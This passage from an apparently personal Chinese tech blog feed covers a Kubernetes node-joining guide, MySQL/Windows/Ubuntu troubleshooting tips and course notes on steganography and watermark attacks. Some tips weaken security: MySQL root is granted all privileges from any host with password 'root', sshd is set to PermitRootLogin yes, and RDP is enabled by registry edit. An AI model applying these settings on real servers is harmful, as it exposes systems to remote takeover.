class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将master机器的<code>/etc/kubernetes/admin.conf</code>传到到node1和node2</p><p>登录<code>master</code>终端（我的没办法用scp命令，是找到之后从master复制到node1,node2）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#将admin.conf传递给node1</span><span class="token function">sudo</span> <span class="token function">scp</span> /etc/kubernetes/admin.conf itcast@192.168.236.178:/home/itcast/<span class="token comment">#将admin.conf传递给node2</span><span class="token function">sudo</span> <span class="token function">scp</span> /etc/kubernetes/admin.conf itcast@192.168.236.179:/home/itcast/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>登录<code>node1</code>终端，创建基础kube配置文件环境</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> -p <span class="token environment constant">$HOME</span>/.kube$ <span class="token function">sudo</span> <span class="token function">cp</span> -i <span class="token environment constant">$HOME</span>/admin.conf <span class="token environment constant">$HOME</span>/.kube/config$ <span class="token function">sudo</span> <span class="token function">chown</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -u<span class="token variable">)</span></span><span class="token builtin class-name">:</span><span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -g<span class="token variable">)</span></span> <span class="token environment constant">$HOME</span>/.kube/config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>登录<code>node2</code>终端，创建基础kube配置文件环境</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> -p <span class="token environment constant">$HOME</span>/.kube$ <span class="token function">sudo</span> <span class="token function">cp</span> -i <span class="token environment constant">$HOME</span>/admin.conf <span class="token environment constant">$HOME</span>/.kube/config$ <span class="token function">sudo</span> <span class="token function">chown</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -u<span class="token variable">)</span></span><span class="token builtin class-name">:</span><span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -g<span class="token variable">)</span></span> <span class="token environment constant">$HOME</span>/.kube/config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li><code>node1</code>和<code>node2</code>分别连接<code>master</code>加入master集群。这里用的是<code>kubeadm join</code>指令(**master生成的，node1,node2运行加入)</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> kubeadm <span class="token function">join</span> <span class="token number">192.168</span>.236.177:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:e778d3665e52f5a680a87b00c6d54df726c2eda601c0db3bfa4bb198af2262a8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里要注意，使用的hash应该是<code>master</code>主机 <code>kubeadm init</code>成功之后生成的hash码。</p><ol start="6"><li>应用两个node主机分别应用flannel网络（我的加入master之后就有网了）</li></ol><p>将<code>master</code>中的<code>kube-flannel.yml</code>分别传递给两个<code>node</code>节点.（我的没办法用scp命令，是找到之后从master复制到node1,node2）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#将kube-flannel.yml传递给node1</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token environment constant">$HOME</span>/working/kube-flannel.yml itcast@192.168.236.178:/home/itcast/<span class="token comment">#将kube-flannel.yml传递给node2</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token environment constant">$HOME</span>/working/kube-flannel.yml itcast@192.168.236.179:/home/itcast/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>分别启动<code>flannel</code>网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@node1:~$ kubectl apply -f kube-flannel.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@node2:~$ kubectl apply -f kube-flannel.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>查看node是否已经加入到k8s集群中(需要等一段时间才能ready)</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@node2:~$ kubectl get nodesNAME     STATUS   ROLES    AGE     VERSIONmaster   Ready    master   35m     v1.13.1node1    Ready    <span class="token operator">&lt;</span>none<span class="token operator">></span>   2m23s   v1.13.1node2    Ready    <span class="token operator">&lt;</span>none<span class="token operator">></span>   40s     v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>question-solve</title>
      <link href="/2022/100426600.html"/>
      <url>/2022/100426600.html</url>
      
        <content type="html"><![CDATA[<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a><strong>mysql</strong></h2><h3 id="命令行查看mysql账号密码"><a href="#命令行查看mysql账号密码" class="headerlink" title="命令行查看mysql账号密码"></a>命令行查看mysql账号密码</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql -u root -pshow databases;use 数据库名;select * from users;sdexit #退出数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysql远程连接"><a href="#mysql远程连接" class="headerlink" title="mysql远程连接"></a>mysql远程连接</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql -u root -p(登录mysql)use &#96;mysql&#96;;grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; WITH GRANT OPTION;(GRANT ALL PRIVILEGES ON *.* TO &#39;myuser&#39;@&#39;your ip&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION;FLUSH PRIVILEGES;)flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysql建表查表操作"><a href="#mysql建表查表操作" class="headerlink" title="mysql建表查表操作"></a>mysql建表查表操作</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;查看当前数据库的所有表名show tables;show tables from 数据库名;&#x2F;&#x2F;在当前数据库中添加表create table 表名(&#x2F;&#x2F;列名 字符格式 约束&#x2F;&#x2F;注意末尾加逗号，最后一列末尾除外uid int(32) primary,uname varchar(32) ,upassword varchar(32));&#x2F;&#x2F;查看表的结构desc 表名;&#x2F;&#x2F;添加表列&#x2F;&#x2F;alter table 表名 add 字段 字符格式 约束alter table user add unifo varchar(32) not null;&#x2F;&#x2F;修改表列alter table 表名 modify 列名 字符格式 约束&#x2F;&#x2F;修改表名alter table 表名  change 旧列名 新列名 新字符格式 新约束&#x2F;&#x2F;重命名rename table 旧表名 to 新表名&#x2F;&#x2F;插入单行数据insert into 表名 VALUES(&#39;1&#39;,&#39;java&#39;,&#39;34.4&#39;,&#39;7&#39;,&#39;张三&#39;);&#x2F;&#x2F;插入多行数据insert into book(列名) VALUES(&#39;1&#39;,&#39;java&#39;,&#39;34.4&#39;,&#39;7&#39;,&#39;张三&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysql查看端口是否被占用"><a href="#mysql查看端口是否被占用" class="headerlink" title="mysql查看端口是否被占用"></a>mysql查看端口是否被占用</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">netstat -a -n  显示各个端口占用netstat -ano   显示各个端口占用和进程PIDnetstat -aon|findstr &quot;3306&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="mysql服务的停止和启用"><a href="#mysql服务的停止和启用" class="headerlink" title="mysql服务的停止和启用"></a>mysql服务的停止和启用</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">net stop mysql 暂停mysqlnet start mysql 启用mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="mysql导出查询"><a href="#mysql导出查询" class="headerlink" title="mysql导出查询"></a>mysql导出查询</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;导出目录查询select @@basedir;&#x2F;&#x2F;导出数据查询select @@datadir;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="windows开启rdp远程桌面服务"><a href="#windows开启rdp远程桌面服务" class="headerlink" title="windows开启rdp远程桌面服务"></a>windows开启rdp远程桌面服务</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查看远程端口或者使用注册表REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber再set &#x2F;a a&#x3D;0xd3d当远程桌面服务被关闭时，可以用注册表命令开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">win+R（调出命令行）mstsc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="windows常用命令"><a href="#windows常用命令" class="headerlink" title="windows常用命令"></a>windows常用命令</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;命令调出计算机管理win+Rcompmgmt.msc&#x2F;&#x2F;打开管理员命令行win+X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MobaXterm连接服务器：Network-error-Connection-refused"><a href="#MobaXterm连接服务器：Network-error-Connection-refused" class="headerlink" title="MobaXterm连接服务器：Network error:Connection refused"></a>MobaXterm连接服务器：Network error:Connection refused</h2><h3 id="1-使用apt安装时报错：-可能在排查错误时出现"><a href="#1-使用apt安装时报错：-可能在排查错误时出现" class="headerlink" title="1.使用apt安装时报错：(可能在排查错误时出现)"></a>1.使用apt安装时报错：(可能在排查错误时出现)</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E: Could not get lock /var/lib/dpkg/lock-frontend - <span class="token function">open</span> <span class="token punctuation">(</span><span class="token number">11</span>: Resource temporarily unavailable<span class="token punctuation">)</span>E: Unable to acquire the dpkg frontend lock <span class="token punctuation">(</span>/var/lib/dpkg/lock-frontend<span class="token punctuation">)</span>, is another process using it?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>解决方案</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">killall</span> <span class="token function">apt</span> <span class="token function">apt-get</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示没有apt进程：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">apt: no process foundapt-get: no process found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>依次执行：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/apt/lists/lock<span class="token function">sudo</span> <span class="token function">rm</span> /var/cache/apt/archives/lock<span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/dpkg/lock*<span class="token function">sudo</span> dpkg --configure -a<span class="token function">sudo</span> <span class="token function">apt</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>apt安装报错解决！</p><h3 id="2-排查MobaXterm出错路径"><a href="#2-排查MobaXterm出错路径" class="headerlink" title="2.排查MobaXterm出错路径"></a>2.排查MobaXterm出错路径</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. 查看sshd相关服务是否存在<span class="token function">apt-get</span> <span class="token function">install</span> openssh-serversystemctl restart <span class="token function">ssh</span><span class="token number">2</span>. 查看22端口是否存在ss -ntl<span class="token number">3</span>.将密码拒绝远程访问改一下配置命令：gedit /etc/ssh/sshd_config将<span class="token comment">#PermitRootLogin prohibit password</span>改为PermitRootLogin <span class="token function">yes</span>命令重启服务：systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MobaXterm连接服务器：Network error:Connection refused问题解决！</p><h2 id="ubuntu开启FTP服务"><a href="#ubuntu开启FTP服务" class="headerlink" title="ubuntu开启FTP服务"></a>ubuntu开启FTP服务</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> vsftpd<span class="token function">sudo</span> <span class="token function">vi</span> /etc/vsftpd.conf<span class="token assign-left variable">local_enable</span><span class="token operator">=</span>YES<span class="token assign-left variable">write_enable</span><span class="token operator">=</span>YES//修改这两行为上述所示<span class="token function">sudo</span> /etc/init.d/vsftpd restart//重启FTP服务//注：如果还无法连接,使用以下操作//将pam_service_name<span class="token operator">=</span>vsftpd 修改为：pam_service_name<span class="token operator">=</span>ftp//之后重启：sudo <span class="token function">service</span> vsftpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ubuntu防火墙、端口"><a href="#ubuntu防火墙、端口" class="headerlink" title="ubuntu防火墙、端口"></a>ubuntu防火墙、端口</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw status//查看防火墙的状态<span class="token function">apt-get</span> <span class="token function">install</span> ufw//安装防火墙<span class="token function">sudo</span> ufw <span class="token builtin class-name">enable</span> //开启防火墙<span class="token function">sudo</span> ufw allow 端口号//开放某端口<span class="token function">sudo</span> ufw reload //重启防火墙生效<span class="token function">sudo</span> <span class="token function">netstat</span> -tunlp <span class="token operator">|</span> <span class="token function">grep</span> 端口号//查看某端口监听状态<span class="token function">sudo</span> ufw delete allow 端口号//防火墙关闭普通端口<span class="token function">sudo</span> ufw allow <span class="token number">8001</span>/tcp//防火墙开放规定协议的端口<span class="token function">sudo</span> ufw delete allow <span class="token number">8001</span>/tcp//防火墙关闭规定协议的端口<span class="token function">sudo</span> ufw allow from ip//开放指定ip所有操作<span class="token function">sudo</span> ufw delete allow from ip//关闭指定ip所有操作<span class="token function">sudo</span> ufw allow from <span class="token function">ip</span> to any port 端口号//开放指定ip对应端口操作<span class="token function">sudo</span> ufw delete allow from <span class="token function">ip</span> to any port 端口号//关闭指定ip对应端口操作<span class="token function">sudo</span> ufw disable//关闭防火墙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ubuntu查看端口是否开放"><a href="#ubuntu查看端口是否开放" class="headerlink" title="ubuntu查看端口是否开放"></a>ubuntu查看端口是否开放</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losf -i:80telnet <span class="token function">ip</span> 端口号//查看端口是否开放<span class="token function">netstat</span> -aptniptables -nl//查看已开放端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="kali-apt-get-update报错The-repository-‘-…-kali-rolling-InRelease’-is-not-signed"><a href="#kali-apt-get-update报错The-repository-‘-…-kali-rolling-InRelease’-is-not-signed" class="headerlink" title="kali apt-get update报错The repository ‘ … kali-rolling InRelease’ is not signed"></a>kali apt-get update报错The repository ‘ … kali-rolling InRelease’ is not signed</h2><p><img src="/2022/100426600/2.png" alt="2"></p><p><strong>解决方法：</strong></p><p><img src="/2022/100426600/3.png" alt="3"></p><p>如果没用，请看下面链接中的方法：</p><p><a href="https://blog.csdn.net/downanddusk/article/details/126334776">kali apt update 时出现 kali-rolling InRelease‘ is not signed解决方法</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大三上课程</title>
      <link href="/2022/09062913.html"/>
      <url>/2022/09062913.html</url>
      
        <content type="html"><![CDATA[<h1 id="大三上课程"><a href="#大三上课程" class="headerlink" title="大三上课程"></a>大三上课程</h1><h2 id="信息隐藏"><a href="#信息隐藏" class="headerlink" title="信息隐藏"></a>信息隐藏</h2><h3 id="2-1-2：基本知识"><a href="#2-1-2：基本知识" class="headerlink" title="2.1-2：基本知识"></a>2.1-2：基本知识</h3><p>​        信息隐藏技术的原理是在载体中隐藏隐秘信息，并通过钥匙提取隐秘信息，载体通常为图像、文本、视频、音频等。信息隐藏技术可以保证别有用心的人很难发现或者提取隐秘信息。当载体通过信道传输到接收器之后，接收器使用密钥恢复隐藏的机密信息。图1为信息隐藏系统模型，由4个主要部分组成：嵌入信息、提取信息、生成密钥和隐藏分析。</p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\信息隐藏-1.png" alt="1"></p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ol><li><strong>隐蔽性</strong></li></ol><p>​        隐藏性是信息隐藏的基本要求，有两个方面：一是对人体感觉系统的不可感知性，通过在信息隐藏过程之后不会显著更改或降解载体，影响对载体信息的理解或引起视觉和听觉方面的明显变化，避免通过人类的感觉检测到。二是计算机之类的分析系统的不可预测性，还存在暴露的风险，因为信息被隐藏而未被人类识别，这并不意味着分析系统无法检测到该信息，这要求操作员在嵌入信息之前和之后尽量保持相同的特性，并且在计算机分析中不能确认信息是否被隐藏。</p><ol start="2"><li><strong>安全性</strong></li></ol><p>​        隐藏信息的内容是安全的，并且必须在加密后隐藏，即使第三方发现存在隐藏信息，没有钥匙也无法解密该信息。</p><ol start="3"><li><strong>鲁棒性</strong></li></ol><p>​        鲁棒性是指经过一系列处理或干扰后，载体中隐藏的信息不会被破坏，可以从中提取出完整的信息。这些处理和干扰包括重采样、有损压缩、模/数转换、滤波、信道噪声以及破坏信息的人为攻击。</p><ol start="4"><li><strong>自恢复性</strong></li></ol><p>​        即使在销毁数据之后，也需要能够基于其余数据独立于原始数据来还原原始隐藏数据。恢复损坏的数据非常重要，因为数据在传输、处理和转换后将不可避免地被破坏。</p><ol start="5"><li><strong>信息容量</strong></li></ol><p>​        信息容量指运营商必须具有一定数量的能力来保存机密信息。这与载体本身的特性、信息隐藏算法有关，并且取决于对机密信息的隐藏和鲁棒性的要求。随着机密信息量的增加，对运营商自身信息的影响和损害不可避免地增加，这增加了暴露的风险，同时降低了隐藏信息的鲁棒性。因此，在实际应用中，应该合理地选取隐蔽性、鲁棒性和信息容量。</p><h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><ul><li><strong>数字水印</strong></li></ul><p>​        数字水印是信息隐藏常用到的技术之一，可以在不影响载体的价值的条件下，将隐秘信息嵌入载体中。其优点之一就是不易被人类感知系统察觉到。数字水印主要有两种：空间数字水印和频率数字水印。空间数字水印的原理是通过改变表示数字图像颜色和调整数字图像的视觉上无关紧要的像素来实现水印信息的表示。频率数字水印的原理是根据时间频率分析和扩散频谱的特征选择数字图像频率区域中视觉最敏感的部分，以使修改后的系数包含数字水印信息。</p><p>​        <strong>替换、变换、扩频技术</strong></p><ul><li><strong>可视密码技术</strong></li></ul><p>​        1994年，Naor和Shamar提出了可视密码技术。可视密码技术的优势在于提取隐秘图像时不需要复杂的密码计算，可以根据人的视觉来区分。该方法制作n张无意义的胶卷，重叠其中的t张胶卷，能够恢复其中隐藏的机密信息。此后，人们对这种加密技术进行了改进，主要的改进方法如下：这使得制作的n张胶片具有特定的含义并且具有迷惑性。</p><ul><li><strong>潜信道</strong></li></ul><p>​        1978年，Gustavus J Simmons提出了潜信道的概念，随后进行了许多研究，其中潜信道是用于实现在公开信道中建立的秘密通信的信道。大多数数字签名方案包括潜信道通信，最大特征是潜信道包含在数字签名中，但是不影响数字签名过程。</p><ul><li><strong>隐匿协议</strong></li></ul><p>​        隐匿协议的原理是通过分析一方的业务量来识别另一方，可以确保通信信道不被他人窃听。隐秘通信通过在路由中使用多个加密层，保证路由的每一层处理不同的数据，可以使数据传输的路径很难被察觉到。隐秘通信的应用领域比较广泛，例如可以用于电子选举和电子现金的解决方案，防止选民或者购买者的身份暴露。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><ol><li><strong>隐秘信道</strong></li></ol><p>​        信息隐藏技术可以用于隐秘通信，将机密数据隐藏到多媒体信息中，通过网络进行发送，由于网络数据比较庞大，因此机密信息很难被检测到。信息隐藏技术与加密技术结合可以保证机密数据发送的安全性。第一，窃听者不清楚机密信息的通信过程，不能在大量的多媒体信息中找到隐藏的数据；第二，数据嵌入进行加密，确保数据安全性。</p><ol start="2"><li><strong>数字作品的版权保护</strong></li></ol><p>​        随着互联网技术的发展，数字作品的形式各种各样，包括数字图书馆、数字书籍出版、数字电视和数字新闻等。数字作品最重要的问题就是版权问题，数字水印技术可以很好地解决版权问题。数字水印以隐藏代码的形式添加到数字作品中，数字水印可以通过代码跟踪非法传播者。鉴于网络普遍存在的易于修改和易于复制的数字媒体的特点，信息隐藏技术可以将水印嵌入数字媒体中以保护版权。例如，为了追踪非法源，保护所有者权益，可以使用数字水印控制复印件，防止无限复制和盗版。</p><ol start="3"><li><strong>保护数据的完整性和真实性</strong></li></ol><p>​        在法律、医学、新闻和商业中应用数字媒体时，使用嵌入的水印来确定信息是否已被更改、伪造或经过特殊处理，以确定其完整性和真实性。例如，新闻采访中拍摄的照片应加水印以免被更改；司法机构使用的数字媒体还可以提取水印，以识别真伪并确定其法律效力。</p><ol start="4"><li><strong>广播监视</strong></li></ol><p>​        数字水印可以用于广播监视，将未压缩的视频进行MPEG-2压缩，使用安全密钥嵌入水印。嵌入的水印可以识别原始广播者和检测非法复制的内容。韩国广播公司技术研究所开发的水印系统可以保护数字电视内容的版权，其服务对象包括标清视频（SMPTE 259M）、高清视频（SMPTE 292 M）、DVD等媒体。标清视频嵌入的水印是64位版权标识符，高清视频嵌入的水印是128版权标识符，广播监视要求数字水印要有较高的不可见性和较好的鲁棒性，但是较高的不可察觉性要求水印强度低，较好的鲁棒性要求水印强度高，因此同时保证不可察觉性和鲁棒性，需要对水印强度进行折中考虑。</p><h4 id="图像文件的格式"><a href="#图像文件的格式" class="headerlink" title="图像文件的格式"></a>图像文件的格式</h4><ul><li>常见的存储的格式有 bmp，jpg，png，tif，gif，pcx，tga，exif，fpx，svg，psd，cdr，pcd，dxf，ufo，eps，ai，raw，WMF，webp，avif，apng 等。</li></ul><h4 id="音频文件的格式"><a href="#音频文件的格式" class="headerlink" title="音频文件的格式"></a>音频文件的格式</h4><ul><li>音频文件格式专指存放音频数据的文件的格式。</li><li>无损格式</li></ul><p>​        <a href="https://baike.baidu.com/item/WAV?fromModule=lemma_inlink">WAV</a>，<a href="https://baike.baidu.com/item/FLAC?fromModule=lemma_inlink">FLAC</a>，<a href="https://baike.baidu.com/item/APE?fromModule=lemma_inlink">APE</a>，<a href="https://baike.baidu.com/item/ALAC?fromModule=lemma_inlink">ALAC</a>，<a href="https://baike.baidu.com/item/WavPack?fromModule=lemma_inlink">WavPack</a>(WV)</p><ul><li>有损格式</li></ul><p>​        <a href="https://baike.baidu.com/item/MP3?fromModule=lemma_inlink">MP3</a>，<a href="https://baike.baidu.com/item/AAC?fromModule=lemma_inlink">AAC</a>，[Ogg Vorbis](<a href="https://baike.baidu.com/item/Ogg">https://baike.baidu.com/item/Ogg</a> Vorbis?fromModule=lemma_inlink)，<a href="https://baike.baidu.com/item/Opus?fromModule=lemma_inlink">Opus</a></p><h4 id="视频文件的格式"><a href="#视频文件的格式" class="headerlink" title="视频文件的格式"></a>视频文件的格式</h4><ul><li>视频文件格式是指视频保存的一种格式，视频是电脑中<a href="https://baike.baidu.com/item/%E5%A4%9A%E5%AA%92%E4%BD%93%E7%B3%BB%E7%BB%9F/700469?fromModule=lemma_inlink">多媒体系统</a>中的重要一环。为了适应储存视频的需要，人们设定了不同的视频文件格式来把视频和音频放在一个文件中，以方便同时回放。</li><li>微软视频</li></ul><p>​        <a href="https://baike.baidu.com/item/wmv?fromModule=lemma_inlink">wmv</a>、<a href="https://baike.baidu.com/item/asf?fromModule=lemma_inlink">asf</a>、<a href="https://baike.baidu.com/item/asx?fromModule=lemma_inlink">asx</a></p><ul><li>Real Player</li></ul><p>​        rm、 <a href="https://baike.baidu.com/item/rmvb?fromModule=lemma_inlink">rmvb</a></p><ul><li>MPEG视频</li></ul><p>​        <a href="https://baike.baidu.com/item/mp4?fromModule=lemma_inlink">mp4</a></p><ul><li>手机视频</li></ul><p>​        <a href="https://baike.baidu.com/item/3gp?fromModule=lemma_inlink">3gp</a></p><ul><li>Apple视频</li></ul><p>​        mov、<a href="https://baike.baidu.com/item/m4v?fromModule=lemma_inlink">m4v</a></p><ul><li>其他</li></ul><p>​        <a href="https://baike.baidu.com/item/avi?fromModule=lemma_inlink">avi</a>、<a href="https://baike.baidu.com/item/dat?fromModule=lemma_inlink">dat</a>、<a href="https://baike.baidu.com/item/mkv?fromModule=lemma_inlink">mkv</a>、<a href="https://baike.baidu.com/item/flv?fromModule=lemma_inlink">flv</a>、<a href="https://baike.baidu.com/item/vob?fromModule=lemma_inlink">vob</a>等</p><h4 id="图像信息隐藏的基本知识"><a href="#图像信息隐藏的基本知识" class="headerlink" title="图像信息隐藏的基本知识"></a>图像信息隐藏的基本知识</h4><ol><li>图像加密算法</li><li>图像信息隐藏技术的一些算法</li><li>实现嵌入提取</li></ol><h4 id="音频信息隐藏的基本知识"><a href="#音频信息隐藏的基本知识" class="headerlink" title="音频信息隐藏的基本知识"></a>音频信息隐藏的基本知识</h4><ol><li>如下图；音频信息隐藏系统通用系统模型分为三个部分：左边是发送端，即完成信息嵌入的过程；中间是信道传输，其包括嵌入信息后的音频信号经历噪音环境或数字攻击等过程；右边是接收端，经过同步后可以确定带噪音频信号嵌有隐藏信息的位置，从而解出隐蔽信息。</li></ol><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\信息隐藏-2.png" alt="2"></p><h4 id="信息隐藏常用攻击方法"><a href="#信息隐藏常用攻击方法" class="headerlink" title="信息隐藏常用攻击方法"></a>信息隐藏常用攻击方法</h4><ol><li><p>隐密分析</p><pre><code> * **感官攻击**</code></pre></li></ol><p>　　感官攻击包括视觉攻击和听觉攻击。是指利用人类感官对媒体模式失真和噪声的辨识能力来判断是否含有隐密信息的一类方法。虽然隐密算法的首要任务就是要使得载体在隐藏信息前后不能被人类的感官察觉，但是由于隐密信息与隐密区域的统计特性不一致，往往会使载体与隐密载体之间产生较大的感官差异，如图像的色彩变化、噪声强度变化等。</p><ul><li><strong>结构攻击</strong></li></ul><p>　　结构攻击是指利用由于信息的隐藏而造成载体原有结构的破坏或特殊结构的引入来判断是否含有隐密信息。比如正常的图像调色板结构中没有或很少有颜色的聚集，但有些隐密算法为了避免视觉攻击，隐藏信息时对调色板进行了缩减、排序等调整，使得调色板中产生大量颜色聚集。</p><ul><li><strong>统计攻击</strong></li></ul><p>　　统计攻击是指利用特征样本分布和理论期望分布的差异性，从而给出含有隐密信息概率的一种分析方法。由于隐密信息的统计特性往往与隐密区。</p><ol start="2"><li>水印攻击</li></ol><ul><li><strong>稳健性攻击</strong></li></ul><p>　　稳健性攻击也称去除攻击，这是最常用的攻击方法。它主要攻击健壮性的数字水印。目的在于除去数据中的水印而不影响图像的使用，比如对图像的一些常用的无恶意的处理方法，如压缩、滤波、缩放、打印和扫描等。常见的健壮性攻击可以分为几方面：有损压缩、信号处理技术。</p><ul><li><strong>表达攻击</strong></li></ul><p>​        表达攻击并不需要除去数字产品中的水印，它是通过操纵内容从而使水印检测器无法检测到水印的存在。这类攻击的一个特点是水印实际上还存在于图像中，但水印检测器已不能提取水印或不能检测水印的存在。几何变换在数字水印攻击中扮演了重要的角色，而且许多数字水印算法都无法抵抗某些重要的几何攻击。常见的几何变换有：水平翻转、剪切、旋转、缩放、行／列删除、变通几何变换、打印一扫描处理和随机几何变形。</p><ul><li><strong>解释攻击</strong></li></ul><p>　　解释攻击既不试图擦除水印，也不试图使水印检测无效，而是试图对水印的所有权产生争议，比如一个攻击者试图在一个嵌入了水印的图像中再次嵌入另一个水印，所以导致了所有权的争议。</p><ul><li><strong>合法攻击</strong></li></ul><p>　　合法攻击也称法律攻击。它与前三种攻击不同，前三种攻击可以称为技术性攻击，而合法攻击可能包括现有的及将来的有关版权和有关数字信息所有权的法案，因为在不同的司法权限中，这些法律可能有不同的解释。如攻击者希望在法庭上利用此类攻击，它们的攻击是在水印方案所提供的技术或科学证据之外而进行的。</p><h3 id="2-3：手工演练基于-BMP-图像的信息隐藏与提取过程任务"><a href="#2-3：手工演练基于-BMP-图像的信息隐藏与提取过程任务" class="headerlink" title="2.3：手工演练基于 BMP 图像的信息隐藏与提取过程任务"></a>2.3：手工演练基于 BMP 图像的信息隐藏与提取过程任务</h3><p>[(50条消息) BMP 图像信息隐藏及检测_苏浅时的博客-CSDN博客_bmp图像信息隐藏](<a 